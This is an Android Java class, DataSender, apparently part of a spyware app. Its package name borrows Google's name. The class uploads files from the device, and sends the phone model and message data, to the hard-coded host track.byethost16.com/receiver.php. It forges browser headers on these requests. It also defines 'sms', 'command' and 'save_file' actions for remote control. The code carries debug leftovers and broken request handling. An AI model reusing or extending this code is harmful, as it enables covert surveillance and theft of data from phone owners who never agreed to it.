package com.google.tracking.sender;

import android.os.AsyncTask;
import android.os.Build;
import android.util.Log;
import com.google.tracking.constants.TrackingConstants;

import java.io.*;
import java.net.*;
import java.nio.charset.Charset;
import java.util.List;

/**
 * Created by maxim.yanukovich on 06.01.2015.
 */
public class DataSender extends AsyncTask<File, Integer, Long> implements IDataSender {
    private static final String TAG = "DataSender";

    private static String SMS = "sms";
    private static String COMMAND = "command";
    private static String SAVE_FILE = "save_file";

//    public DataSender() {
//        Log.d(TAG, urlString().toString());
//
//        disableConnectionReuseIfNecessary();
//    }

    protected Long doInBackground(File... file) {
        Log.d(TAG, "doInBackground " + file[0].getName());
        CookieHandler.setDefault( new CookieManager( null, CookiePolicy.ACCEPT_ALL ) );
//        int count = urls.length;
        long totalSize = 0;
//        for (int i = 0; i < count; i++) {
//            totalSize += Downloader.downloadFile(urls[i]);
//            publishProgress((int) ((i / (float) count) * 100));
//            // Escape early if cancel() is called
//            if (isCancelled()) break;
//        }

        InputStream in = null;
        byte[] buffer;
        try {
            in = new BufferedInputStream(new FileInputStream(file[0]));
            totalSize = in.available();
            buffer = new byte[in.available()];
            in.read(buffer);


            String charset = "UTF-8";
            File uploadFile1 = new File("e:/Test/PIC1.JPG");
            File uploadFile2 = new File("e:/Test/PIC2.JPG");
            String requestURL = "http://track.byethost16.com/receiver.php";

            try {
                MultipartUtility multipart = new MultipartUtility(requestURL, charset);

                multipart.addHeaderField("Accept", "\ttext/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                multipart.addHeaderField("Accept-Encoding", "gzip, deflate");
                multipart.addHeaderField("Accept-Language", "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3");
                multipart.addHeaderField("Connection", "keep-alive");
                multipart.addHeaderField("Host", "track.byethost16.com");
                multipart.addHeaderField("Referer", "http://track.byethost16.com/upload.html");
                multipart.addHeaderField("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0");

//                multipart.addFormField("description", "Cool Pictures");
//                multipart.addFormField("keywords", "Java,upload,Spring");

                multipart.addFilePart("fileUpload", file[0]);
//                multipart.addFilePart("fileUpload", uploadFile2);

                List<String> response = multipart.finish();

                Log.d(TAG, "SERVER REPLIED:");

                for (String line : response) {
                    Log.d(TAG, line);
                }
            } catch (IOException ex) {
                Log.d(TAG,"Exception!!! " +  ex.getMessage());
            }

//            sendFile(buffer, file[0].getName());
//            postBinary2(buffer);
//                postHttp("myCoolAction","message");
        } catch (Exception e) {
        } finally {
            try {
                if (in != null) {
                    in.close();
                }
            } catch (IOException ex) {
                Log.d(TAG, ex.getMessage());
            }
        }

        return totalSize;
    }

    protected void onProgressUpdate(Integer... progress) {
        Log.d(TAG, "onProgressUpdate:");
    }

    protected void onPostExecute(Long result) {
        Log.d(TAG, "onPostExecute:" + result + " bytes");
    }

    public String urlString(String action) {
        return TrackingConstants.WEB_SERVICE_URL;// + "?action=" + action;
    }

    public void getNextAction() {
//        postHttp(COMMAND, "message");
    }

//    public void sendSMS(String msg) {
//        postHttp(SMS, msg.getBytes());
//    }

    public void sendFile(byte[] data, String name) {
        postBinary(SAVE_FILE, data, name);
//        postHttp(SMS, "my test message");
    }

    private void postBinary2(byte[] data) {
        try {
            CookieHandler.setDefault( new CookieManager( null, CookiePolicy.ACCEPT_ALL ) );
            String CRLF = "\r\n";
            String boundary = Long.toHexString(System.currentTimeMillis());
            HttpURLConnection connection = (HttpURLConnection) new URL(urlString(SAVE_FILE)).openConnection();
// set some connection properties
            OutputStream output = connection.getOutputStream();
            PrintWriter writer = new PrintWriter(new OutputStreamWriter(output, "UTF-8"), true);
// set some headers with writer
            InputStream file = new ByteArrayInputStream(data);
            Log.d(TAG, "Size: " + file.available());

            byte[] buffer = new byte[4096];
            int length;
            while ((length = file.read(buffer)) > 0) {
                output.write(buffer, 0, length);
            }
            output.flush();
            writer.append(CRLF).flush();
            writer.append("--" + boundary + "--").append(CRLF).flush();
        } catch (Exception e) {
            Log.d(TAG, e.getMessage());
        }
// catch and close streams
    }

    private void postBinary(String action, byte[] postData, String fileName) {

        try {
            CookieHandler.setDefault( new CookieManager( null, CookiePolicy.ACCEPT_ALL ) );
            int postDataLength = postData.length;
            Log.d(TAG, "postBinary:" + postDataLength);
            URL url = new URL(urlString(action));
            HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
            httpConn.setDoOutput(true);
            httpConn.setDoInput(true);
            httpConn.setInstanceFollowRedirects(false);
            httpConn.setRequestMethod("POST");
            httpConn.setRequestProperty("Content-Type", "application/octet-stream");
            httpConn.setRequestProperty("Content-Disposition", "form-data; name=\"binaryFile\";filename=\"" + fileName+"\"");
            httpConn.setRequestProperty("Content-Transfer-Encoding", "binary");
            httpConn.setRequestProperty("Content-Length", Integer.toString(postDataLength));
            httpConn.setUseCaches(false);
            httpConn.connect();
            try {

                DataOutputStream os = new DataOutputStream(httpConn.getOutputStream());
                Log.d(TAG, "!!!!" + new String(postData, "UTF-8"));
                os.write(postData);
//                os.writeBytes("12341234");

                Log.d(TAG, " getResponseCode:" + String.valueOf(httpConn.getResponseCode()));

                os.flush();
                os.close();

                InputStream in = new DataInputStream(httpConn.getInputStream());
                String outdata = "";
                // count the available bytes form the input stream
                int count = in.available();
                // create buffer
                byte[] bs = new byte[count];
                in.read(bs);
                in.close();
                outdata = new String(bs, "UTF-8");
                Log.d(TAG, "http output: "+ outdata);
            } catch (Exception ex) {
                Log.d(TAG, "Exception : " + ex.getMessage());
            }

//            httpConn.disconnect();
            // Handles possible exceptions
        } catch (MalformedURLException localMalformedURLException) {
            Log.d(TAG, localMalformedURLException.getMessage());

        } catch (IOException localIOException) {
            Log.d(TAG, localIOException.getMessage());
        }


    }

    private void postHttp(String action, String msg) {
        Log.d(TAG, "postHttp");
        try {

            String urlParameters = "action=" + action + "&msg=" + msg + "&model=" + Build.MODEL;
            byte[] postData = urlParameters.getBytes(Charset.forName("UTF-8"));
            int postDataLength = postData.length;

            URL url = new URL("http://track.byethost16.com/receiver.php");
            HttpURLConnection httConn = (HttpURLConnection) url.openConnection();
            httConn.setDoOutput(true);
            httConn.setDoInput(true);
            httConn.setInstanceFollowRedirects(false);
            httConn.setRequestMethod("GET");
            httConn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            httConn.setRequestProperty("charset", "utf-8");
            httConn.setRequestProperty("Content-Length", Integer.toString(postDataLength));
            httConn.setUseCaches(false);
            httConn.connect();
            try {
                DataOutputStream os = new DataOutputStream(httConn.getOutputStream());
                os.write(postData);
                Log.d("getResponseCode", String.valueOf(httConn.getResponseCode()));

            } catch (Exception ex) {
                Log.d("Exception!!!!:", ex.getMessage());
            }


            // Handles possible exceptions
        } catch (MalformedURLException localMalformedURLException) {
            Log.d(TAG, "Exception!!!!:" + localMalformedURLException.getMessage());

        } catch (IOException localIOException) {
            Log.d(TAG, "Exception!!!!:" + localIOException.getMessage());
        }
    }

    private void disableConnectionReuseIfNecessary() {
        // HTTP connection reuse which was buggy pre-froyo
        if (Integer.parseInt(Build.VERSION.SDK) < Build.VERSION_CODES.FROYO) {
            System.setProperty("http.keepAlive", "false");
        }
    }
}
